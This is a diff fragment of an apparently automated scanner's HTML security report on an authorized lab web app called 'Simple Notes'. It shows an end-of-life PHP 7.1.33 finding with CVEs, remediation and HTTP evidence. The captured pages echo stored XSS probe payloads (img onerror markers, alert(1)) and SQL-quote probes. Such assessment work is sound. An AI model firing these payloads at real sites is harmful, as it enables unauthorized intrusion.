+                                &lt;td&gt;&lt;p&gt;sqlquote&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#f57c00">MEDIUM</span> 3. [vulnerable-component] End-of-life PHP 7.1.33 — unsupported since 2019-12-01, multiple unpatched post-EOL CVEs</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32873/</div>
+<div class="desc">The application runs on PHP 7.1.33, disclosed via the `X-Powered-By: PHP/7.1.33` response header. This is a VERSION-BASED finding (banner-matched, not exploited).
+
+7.1.33 is the FINAL release of the PHP 7.1 branch, which reached end-of-life on 2019-12-01. It has received NO security patches for ~6.5 years, so every vulnerability fixed in 7.2+ after that date remains unpatched here. Confirmed-applicable post-EOL CVEs that were fixed in later branches but never backported to 7.1:
+- CVE-2020-7059 — out-of-bounds read in php_oci / similar (DoS / info leak).
+- CVE-2020-7060 — out-of-bounds read in mb_strtolower() with crafted multibyte input.
+- CVE-2020-7064 — out-of-bounds read in exif_read_data() (info leak).
+- CVE-2020-7066 — get_headers() truncation on NUL byte → requests sent to an unintended host (SSRF/info-leak aid).
+- CVE-2021-21702 — SoapClient NULL-pointer dereference → DoS.
+These are predominantly memory-safety / DoS / info-leak issues (severity medium); there is no confirmed default-config unauthenticated RCE in 7.1.33 itself. NOTE: CVE-2019-11043 (PHP-FPM RCE) was actually FIXED in 7.1.33, so it does NOT apply. The core risk is running a wholly unsupported runtime that will never receive fixes for future PHP vulnerabilities.
+
+Remediation: migrate to a supported PHP branch (8.2+) and set `expose_php = Off` to suppress the X-Powered-By banner.</div>
+<div><b>Reproduction</b></div><pre>1. GET http://target.local:32873/index.php and inspect response headers → `X-Powered-By: PHP/7.1.33` (ev-mqz72yer-5k, 200/27470 bytes). 2. Reproduced identically on / (ev-mqz72xst-5j, 200/27470 bytes). 3. Negative control: GET /verdict-nonexistent-path-404-check → Apache-handled 404 with NO X-Powered-By header (ev-mqz7301p-5m, 404/279 bytes). Map 7.1.33 → EOL 2019-12-01 and the unpatched CVEs above.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz7301p-5m</code> — <code>artifacts/_/ev-mqz7301p-5m/</code></div><div class="lbl">REQUEST</div><pre>GET /verdict-nonexistent-path-404-check HTTP/1.1
+Host: target.local:32873
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: Keep-Alive
+content-length: 279
+content-type: text/html; charset=iso-8859-1
+date: Mon, 29 Jun 2026 12:29:24 GMT
+keep-alive: timeout=5, max=97
+server: Apache/2.4.38 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.38 (Debian) Server at target.local Port 32873&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz72yer-5k</code> — <code>artifacts/_/ev-mqz72yer-5k/</code></div><div class="lbl">REQUEST</div><pre>GET /index.php HTTP/1.1
+Host: target.local:32873
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE (truncated)</div><pre>HTTP/1.1 200
+cache-control: no-store, no-cache, must-revalidate
+connection: Keep-Alive
+content-length: 27470
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 12:29:22 GMT
+expires: Thu, 19 Nov 1981 08:52:00 GMT
+keep-alive: timeout=5, max=99
+pragma: no-cache
+server: Apache/2.4.38 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.1.33
+
+&lt;!doctype html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+      &lt;title&gt;Simple Notes&lt;/title&gt;
+      &lt;link rel=&quot;stylesheet&quot; href=&quot;static/styles.css&quot;&gt;
+      &lt;link rel=&quot;icon&quot; href=&quot;static/favicon.ico&quot; type=&quot;image/x-icon&quot;&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &amp;nbsp;&lt;/br&gt;
+        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                &lt;tr&gt;
+                    &lt;td width=&quot;90%&quot;&gt;&lt;h1&gt;Welcome test&lt;/h1&gt;&lt;/td&gt;
+                    &lt;td text-align=&quot;right&quot;&gt;&lt;a class=&quot;button&quot; href=&quot;logout.php&quot;&gt;Logout&lt;/a&gt;&lt;/td&gt;
+                &lt;/tr&gt;
+            &lt;/table&gt;
+        &lt;/div&gt;
+                                &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-testfile&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-content-marker&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;xss-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdictstoXmqz5ngu6676vsafe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;xss-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=&amp;quot;window.__verdict_xss=\'stoXmqz5ngu6676v\'&amp;quot;&amp;gt;&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;Zmark9h3&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;Zmark9body&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;xss-probe2&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdictstoXmqz5pnlnesg7safe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;xss-probe2&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=&amp;quot;window.__verdict_xss=\'stoXmqz5pnlnesg7\'&amp;quot;&amp;gt;&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdictstoXmqz5pw4hjk7lsafe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;titlexsstest&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=&amp;quot;window.__verdict_xss=\'stoXmqz5pw4hjk7l\'&amp;quot;&amp;gt;&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;titlexsstest&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;csrf-test&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;csrf-test&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;csrf-test&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;csrf-test&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;sqltest\'&amp;quot;&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;sqltestbody&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;xsstitle&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdictstoXmqz5wu4ogxiusafe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;xsstitle&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=&amp;quot;window.__verdict_xss=\'stoXmqz5wu4ogxiu\'&amp;quot;&amp;gt;&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdictstoXmqz5xl18ahhgsafe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;xssbody&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=&amp;quot;window.__verdict_xss=\'stoXmqz5xl18ahhg\'&amp;quot;&amp;gt;&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;xssbody&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdictsqli\'&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-sx&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdictstoXmqz60yqs3hdzsafe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-sx&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=&amp;quot;window.__verdict_xss=\'stoXmqz60yqs3hdz\'&amp;quot;&amp;gt;&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdictstoXmqz62ee74q67safe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-title-sink&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=&amp;quot;window.__verdict_xss=\'stoXmqz62ee74q67\'&amp;quot;&amp;gt;&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-title-sink&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;csrf-test&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;csrf-test-body&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;csrf-test&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;csrf-test-body&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdictSQLbase&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;sqlbaseline&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdictSQL\'&amp;quot;`--&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;sqlquote&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz72xst-5j</code> — <code>artifacts/_/ev-mqz72xst-5j/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32873
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE (truncated)</div><pre>HTTP/1.1 200
+cache-control: no-store, no-cache, must-revalidate
+connection: Keep-Alive
+content-length: 27470
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 12:29:21 GMT
+expires: Thu, 19 Nov 1981 08:52:00 GMT
+keep-alive: timeout=5, max=100
+pragma: no-cache
+server: Apache/2.4.38 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.1.33
+
+&lt;!doctype html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+      &lt;title&gt;Simple Notes&lt;/title&gt;
+      &lt;link rel=&quot;stylesheet&quot; href=&quot;static/styles.css&quot;&gt;
+      &lt;link rel=&quot;icon&quot; href=&quot;static/favicon.ico&quot; type=&quot;image/x-icon&quot;&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &amp;nbsp;&lt;/br&gt;
+        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                &lt;tr&gt;
+                    &lt;td width=&quot;90%&quot;&gt;&lt;h1&gt;Welcome test&lt;/h1&gt;&lt;/td&gt;
+                    &lt;td text-align=&quot;right&quot;&gt;&lt;a class=&quot;button&quot; href=&quot;logout.php&quot;&gt;Logout&lt;/a&gt;&lt;/td&gt;
+                &lt;/tr&gt;
+            &lt;/table&gt;
+        &lt;/div&gt;
+                                &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-testfile&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-content-marker&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;xss-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdictstoXmqz5ngu6676vsafe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;xss-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=&amp;quot;window.__verdict_xss=\'stoXmqz5ngu6676v\'&amp;quot;&amp;gt;&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;Zmark9h3&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;Zmark9body&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;xss-probe2&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdictstoXmqz5pnlnesg7safe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
